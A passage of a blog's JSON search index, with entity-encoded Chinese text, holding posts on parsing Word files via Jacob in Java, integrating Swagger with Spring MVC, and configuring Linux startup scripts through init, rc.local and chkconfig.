Dispatch.call(document, &quot;SaveAs&quot; , new Variant( &quot;D://test1.docx&quot;)); Dispatch.call(document, &quot;Close&quot;, new Variant(true)); Dispatch.call(word, &quot;Quit&quot;); long time2 = System.currentTimeMillis(); double time3 = (time2 - time1)/1000; System.out.println(time3 + &quot; &#x79D2;.&quot;); }} .NET&#x89E3;&#x51B3;&#x65B9;&#x6848;Jacob&#x7B49;Java&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53EA;&#x80FD;&#x89E3;&#x51B3;&#x90E8;&#x5206;&#x89E3;&#x6790;&#x95EE;&#x9898;&#xFF0C;&#x540E;&#x671F;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x70B9;net&#x89E3;&#x51B3;&#x7684;&#x3002;&#x8BE6;&#x60C5;&#x6B64;&#x5904;&#x7565;&#x8FC7;&#xFF0C;&#x4E0D;&#x4FBF;&#x900F;&#x9732;&#x3002; &#x5176;&#x4ED6;&#x83C1;&#x4F18;&#x7F51;&#x3001;&#x68AF;&#x5B50;&#x7F51;&#x3001;&#x733F;&#x9898;&#x5E93;&#x7684;&#x6570;&#x5B66;&#x516C;&#x5F0F;&#x662F;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x7684;&#xFF1F;http://www.jianshu.com/p/285737195278","raw":null,"content":null,"categories":[{"name":"其他技术","slug":"其他技术","permalink":"http://www.wangxin123.com/categories/其他技术/"}],"tags":[{"name":"word解析","slug":"word解析","permalink":"http://www.wangxin123.com/tags/word解析/"}]},{"title":"API文档工具-Swagger的集成","slug":"API文档工具-Swagger的集成","date":"2016-09-10T10:24:17.000Z","updated":"2016-11-18T01:17:04.149Z","comments":true,"path":"2016/09/10/API文档工具-Swagger的集成/","link":"","permalink":"http://www.wangxin123.com/2016/09/10/API文档工具-Swagger的集成/","excerpt":"&#x6700;&#x8FD1;&#x5B89;&#x88C5;&#x4E86;API&#x6587;&#x6863;&#x5DE5;&#x5177;swagger&#xFF0C;&#x56E0;&#x4E3A;Github&#x4E0A;&#x5DF2;&#x6709;&#x8BE6;&#x7EC6;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#xFF0C;&#x4E14;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x78B0;&#x5230;&#x5927;&#x7684;&#x963B;&#x788D;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x6587;&#x4EC5;&#x5BF9;&#x8FD9;&#x6B21;&#x5B89;&#x88C5;&#x505A;&#x4E00;&#x4EFD;&#x5927;&#x81F4;&#x8BB0;&#x5F55; &#x76F8;&#x5173;&#x7F51;&#x7AD9;Swagger &#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;http://swagger.wordnik.com Github&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x3010;springmvc&#x96C6;&#x6210;swagger&#x3011;:https://github.com/rlogiacco/swagger-springmvc &#x7F51;&#x4E0A;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x3010;&#x53EF;&#x914D;&#x5408;Github&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x4F7F;&#x7528;&#x3011;&#xFF1A;http://www.jianshu.com/p/5cfbe62a1569http://blog.csdn.net/fengspg/article/details/43705537 Swagger&#x6CE8;&#x89E3;&#x8BE6;&#x89E3;&#xFF1A;https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodelhttp://www.cnblogs.com/java-zhao/p/5348113.html &#x3010;springboot + swagger&#x3011; API&#x6587;&#x6863;&#x5DE5;&#x5177; RAML&#x3001;Swagger&#x548C;Blueprint&#x4E09;&#x8005;&#x7684;&#x6BD4;&#x8F83;&#xFF1A;http://www.cnblogs.com/softidea/p/5728952.html","keywords":null,"text":"&#x6700;&#x8FD1;&#x5B89;&#x88C5;&#x4E86;API&#x6587;&#x6863;&#x5DE5;&#x5177;swagger&#xFF0C;&#x56E0;&#x4E3A;Github&#x4E0A;&#x5DF2;&#x6709;&#x8BE6;&#x7EC6;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#xFF0C;&#x4E14;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x78B0;&#x5230;&#x5927;&#x7684;&#x963B;&#x788D;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x6587;&#x4EC5;&#x5BF9;&#x8FD9;&#x6B21;&#x5B89;&#x88C5;&#x505A;&#x4E00;&#x4EFD;&#x5927;&#x81F4;&#x8BB0;&#x5F55; &#x76F8;&#x5173;&#x7F51;&#x7AD9;Swagger &#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;http://swagger.wordnik.com Github&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x3010;springmvc&#x96C6;&#x6210;swagger&#x3011;:https://github.com/rlogiacco/swagger-springmvc &#x7F51;&#x4E0A;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x3010;&#x53EF;&#x914D;&#x5408;Github&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x4F7F;&#x7528;&#x3011;&#xFF1A;http://www.jianshu.com/p/5cfbe62a1569http://blog.csdn.net/fengspg/article/details/43705537 Swagger&#x6CE8;&#x89E3;&#x8BE6;&#x89E3;&#xFF1A;https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodelhttp://www.cnblogs.com/java-zhao/p/5348113.html &#x3010;springboot + swagger&#x3011; API&#x6587;&#x6863;&#x5DE5;&#x5177; RAML&#x3001;Swagger&#x548C;Blueprint&#x4E09;&#x8005;&#x7684;&#x6BD4;&#x8F83;&#xFF1A;http://www.cnblogs.com/softidea/p/5728952.html &#x9519;&#x8BEF;&#x8BB0;&#x5F55;&#x914D;&#x7F6E;&#x5B8C;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x9879;&#x76EE;&#x540E;&#xFF0C;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A; &#x539F;&#x56E0;&#xFF1A;&#x5728;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;index.html&#x65F6;&#xFF0C;ip&#x548C;&#x7AEF;&#x53E3;&#x4E2D;&#x95F4;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x659C;&#x6760;&#xFF0C;&#x53BB;&#x6389;&#x659C;&#x6760;&#x5373;&#x53EF;&#x3002; PS&#xFF1A;&#x679C;&#x4E0D;&#x662F;&#x4EE5;&#x4E0A;&#x539F;&#x56E0;&#x9020;&#x6210;&#xFF0C;&#x8BF7;&#x79FB;&#x6B65; https://github.com/swagger-api/swagger-ui &#x67E5;&#x770B;&#x6B64;&#x9519;&#x8BEF;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;:","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"Swagger","slug":"Swagger","permalink":"http://www.wangxin123.com/tags/Swagger/"}]},{"title":"Linux开机启动程序详解","slug":"Linux开机启动程序详解","date":"2016-09-06T14:41:19.000Z","updated":"2017-01-09T12:06:34.247Z","comments":true,"path":"2016/09/06/Linux开机启动程序详解/","link":"","permalink":"http://www.wangxin123.com/2016/09/06/Linux开机启动程序详解/","excerpt":"init&#x8FDB;&#x7A0B;init&#x8FDB;&#x7A0B;&#x662F;&#x975E;&#x5185;&#x6838;&#x8FDB;&#x7A0B;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x88AB;&#x542F;&#x52A8;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x8FDB;&#x7A0B;&#x7F16;&#x53F7;PID&#x7684;&#x503C;&#x603B;&#x662F;1&#x3002;init&#x8BFB;&#x5B83;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/inittab&#xFF0C;&#x51B3;&#x5B9A;&#x9700;&#x8981;&#x542F;&#x52A8;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;(Runlevel)&#x3002;&#x4ECE;&#x6839;&#x672C;&#x4E0A;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x89C4;&#x5B9A;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x4E2A;&#x7EA7;&#x522B;(&#x5206;&#x522B;&#x7531;0&#x5230;6&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;)&#x6EE1;&#x8DB3;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#x4E86;initdefault&#x7EA7;&#x522B;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5C31;&#x76F4;&#x63A5;&#x88AB;&#x9009;&#x4E2D;&#xFF0C;&#x5426;&#x5219;&#x9700;&#x8981;&#x7531;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x503C;&#x3002;&#x8F93;&#x5165;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x4E4B;&#x540E;&#xFF0C;init&#x6839;&#x636E;/etc/inittab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D6;&#x51B3;&#x4E8E;&#x5B89;&#x88C5;&#x9636;&#x6BB5;&#x5BF9;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x7684;&#x9009;&#x62E9;&#xFF1A;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6587;&#x672C;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;X-Window&#x7684;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x3002;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#xFF0C;&#x5F53;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x5C06;&#x7531;/etc/inittab&#x6587;&#x4EF6;&#x5B9A;&#x4E49;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x54EA;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x8D1F;&#x8D23;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x8BE5;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7279;&#x5B9A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x3002;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x662F;/etc/rc.d/rc&#xFF0C;&#x5B83;&#x8D1F;&#x8D23;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6309;&#x7167;&#x6B63;&#x786E;&#x7684;&#x987A;&#x5E8F;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5F88;&#x5BB9;&#x6613;&#x53D8;&#x5F97;&#x96BE;&#x4EE5;&#x63A7;&#x5236;&#xFF01;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x7C7B;&#x4E8B;&#x4EF6;&#x7684;&#x53D1;&#x751F;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x65B9;&#x6848;&#x3002;","keywords":null,"text":"init&#x8FDB;&#x7A0B;init&#x8FDB;&#x7A0B;&#x662F;&#x975E;&#x5185;&#x6838;&#x8FDB;&#x7A0B;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x88AB;&#x542F;&#x52A8;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x8FDB;&#x7A0B;&#x7F16;&#x53F7;PID&#x7684;&#x503C;&#x603B;&#x662F;1&#x3002;init&#x8BFB;&#x5B83;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/inittab&#xFF0C;&#x51B3;&#x5B9A;&#x9700;&#x8981;&#x542F;&#x52A8;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;(Runlevel)&#x3002;&#x4ECE;&#x6839;&#x672C;&#x4E0A;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x89C4;&#x5B9A;&#x4E86;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x4E2A;&#x7EA7;&#x522B;(&#x5206;&#x522B;&#x7531;0&#x5230;6&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;)&#x6EE1;&#x8DB3;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x3002;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#x4E86;initdefault&#x7EA7;&#x522B;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5C31;&#x76F4;&#x63A5;&#x88AB;&#x9009;&#x4E2D;&#xFF0C;&#x5426;&#x5219;&#x9700;&#x8981;&#x7531;&#x7528;&#x6237;&#x8F93;&#x5165;&#x4E00;&#x4E2A;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x503C;&#x3002;&#x8F93;&#x5165;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x4E4B;&#x540E;&#xFF0C;init&#x6839;&#x636E;/etc/inittab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D6;&#x51B3;&#x4E8E;&#x5B89;&#x88C5;&#x9636;&#x6BB5;&#x5BF9;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x7684;&#x9009;&#x62E9;&#xFF1A;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6587;&#x672C;&#x7684;&#xFF0C;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;X-Window&#x7684;&#x767B;&#x5F55;&#x7A0B;&#x5E8F;&#x3002;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#xFF0C;&#x5F53;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x5C06;&#x7531;/etc/inittab&#x6587;&#x4EF6;&#x5B9A;&#x4E49;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x54EA;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x8D1F;&#x8D23;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x8BE5;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7279;&#x5B9A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x3002;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x7BA1;&#x7406;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4F7F;&#x7528;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x662F;/etc/rc.d/rc&#xFF0C;&#x5B83;&#x8D1F;&#x8D23;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6309;&#x7167;&#x6B63;&#x786E;&#x7684;&#x987A;&#x5E8F;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5F88;&#x5BB9;&#x6613;&#x53D8;&#x5F97;&#x96BE;&#x4EE5;&#x63A7;&#x5236;&#xFF01;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x7C7B;&#x4E8B;&#x4EF6;&#x7684;&#x53D1;&#x751F;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x65B9;&#x6848;&#x3002; &#x5BF9;&#x6BCF;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x6765;&#x8BF4;&#xFF0C;&#x5728;/etc/rc.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;&#x4E0B;&#x7EA7;&#x76EE;&#x5F55;&#x3002;&#x8FD9;&#x4E9B;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x4E0B;&#x7EA7;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x547D;&#x540D;&#x65B9;&#x6CD5;&#x662F;rcX.d&#xFF0C;&#x5176;&#x4E2D;&#x7684;X&#x5C31;&#x662F;&#x4EE3;&#x8868;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x5B57;&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C;&#x7EA7;&#x522B;3&#x7684;&#x5168;&#x90E8;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/etc/rc.d/rc3.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x3002;&#x5728;&#x5404;&#x4E2A;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x7684;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x90FD;&#x5EFA;&#x7ACB;&#x6709;&#x5230;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x5E76;&#x4E0D;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x539F;&#x6765;&#x7684;&#x540D;&#x5B57;&#x3002;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#xFF1B;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x7528;&#x6765;&#x5173;&#x95ED;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#xFF0C;&#x5176;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x3002;&#x8BB8;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x90FD;&#x5F88;&#x91CD;&#x8981;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5148;&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#xFF0C;&#x5C31;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x4F7F;&#x7528;DNS&#x670D;&#x52A1;&#x89E3;&#x6790;&#x4E3B;&#x673A;&#x540D;&#xFF01;&#x4E3A;&#x4E86;&#x5B89;&#x6392;&#x5B83;&#x4EEC;&#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#xFF0C;&#x5728;&#x5B57;&#x6BCD;S&#x6216;&#x8005;K&#x7684;&#x540E;&#x9762;&#x7D27;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;&#x4E24;&#x4F4D;&#x6570;&#x5B57;&#xFF0C;&#x6570;&#x503C;&#x5C0F;&#x7684;&#x5728;&#x6570;&#x503C;&#x5927;&#x7684;&#x524D;&#x9762;&#x6267;&#x884C;&#x3002;&#x6BD4;&#x5982;&#xFF1A;/etc/rc.d/rc3.d/S50inet&#x5C31;&#x4F1A;&#x5728;/etc/rc.d/rc3.d/S55named&#x4E4B;&#x524D;&#x6267;&#x884C;(S50inet&#x914D;&#x7F6E;&#x7F51;&#x7EDC;&#x8BBE;&#x7F6E;&#xFF0C;55named&#x542F;&#x52A8;DNS&#x670D;&#x52A1;&#x5668;)&#x3002;&#x5B58;&#x653E;&#x5728;/etc/rc.d/init.d&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x3001;&#x88AB;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x4E0A;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x662F;&#x771F;&#x6B63;&#x7684;&#x5B9E;&#x5E72;&#x5BB6;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x5B8C;&#x6210;&#x4E86;&#x542F;&#x52A8;&#x6216;&#x8005;&#x505C;&#x6B62;&#x5404;&#x79CD;&#x670D;&#x52A1;&#x7684;&#x64CD;&#x4F5C;&#x8FC7;&#x7A0B;&#x3002;&#x5F53;/etc/rc.d/rc&#x8FD0;&#x884C;&#x901A;&#x8FC7;&#x6BCF;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x8FD0;&#x884C;&#x7EA7;&#x522B;&#x5B50;&#x76EE;&#x5F55;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x6839;&#x636E;&#x6570;&#x5B57;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8C03;&#x7528;&#x5404;&#x4E2A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x5B83;&#x5148;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x3002;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;K&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Stop&#x53C2;&#x6570;&#xFF1B;&#x7C7B;&#x4F3C;&#x5730;&#x5BF9;&#x4EE5;&#x5B57;&#x6BCD;S&#x6253;&#x5934;&#x7684;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x4F20;&#x9012;Start&#x53C2;&#x6570;&#x3002;&#x7F16;&#x5199;&#x81EA;&#x5DF1;&#x7684;rc&#x547D;&#x4EE4;&#x811A;&#x672C;&#x5728;&#x7EF4;&#x62A4;Linux&#x7CFB;&#x7EDF;&#x8FD0;&#x8F6C;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x80AF;&#x5B9A;&#x4F1A;&#x9047;&#x5230;&#x9700;&#x8981;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x5BF9;&#x5F00;&#x673A;&#x6216;&#x8005;&#x5173;&#x673A;&#x547D;&#x4EE4;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x7684;&#x60C5;&#x51B5;&#x3002; &#x4E00;&#x3001;/etc/rc.d/rc.local&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x7F16;&#x8F91;&#x201C;/etc/rc.d/rc.local(&#x94FE;&#x63A5;&#x5730;&#x5740;&#x4E3A;/etc/rc.local)&#x201D;&#xFF0C;&#x628A;&#x542F;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;shell&#x547D;&#x4EE4;&#x8F93;&#x5165;&#x8FDB;&#x53BB;&#x5373;&#x53EF;&#xFF0C;&#x8F93;&#x5165;&#x547D;&#x4EE4;&#x7684;&#x5168;&#x8DEF;&#x5F84;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;windows&#x4E0B;&#x7684;&#x201C;&#x542F;&#x52A8;&#x201D;&#x3002; 12345678910111213141516#&#x5728;centos7&#x4E2D;,/etc/rc.d/rc.local&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x88AB;&#x964D;&#x4F4E;&#x4E86;,&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x81EA;&#x5DF1;&#x7684;&#x811A;&#x672C;&#x662F;&#x4E0D;&#x80FD;&#x8D77;&#x52A8;&#x4E00;&#x4E9B;&#x670D;&#x52A1;&#x7684;,&#x6267;&#x884C;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x6587;&#x4EF6;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x6267;&#x884C;&#x7684;&#x6587;&#x4EF6;chmod +x /etc/rc.d/rc.localvim /etc/rc.d/rc.local# &#x6587;&#x4EF6;&#x6700;&#x540E;&#x6DFB;&#x52A0;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;/data/run/script/start-service.sh#&#x5728;&#x811A;&#x672C;&#x4E2D;&#x8F93;&#x5165;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5982;&#x5F00;&#x673A;&#x542F;&#x52A8;tomcat#!/bin/bashexport JDK_HOME=/home/java/jdk1.8.0_91export JAVA_HOME=/home/java/jdk1.8.0_91/home/tomcat/apache-tomcat-8.0.36/bin/startup.sh#&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;chmod +x /data/run/script/start-service.sh &#x8FD9;&#x6837;&#xFF0C;start-service.sh&#x811A;&#x672C;&#x5728;&#x5F00;&#x673A;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#x4E86;,&#x4EE5;&#x540E;&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6DFB;&#x52A0;&#x5728;&#x8BE5;&#x811A;&#x672C;&#x4E2D;&#x3002; &#x4E8C;&#x3001;chkconfig123456789101112131415161718192021222324252627# 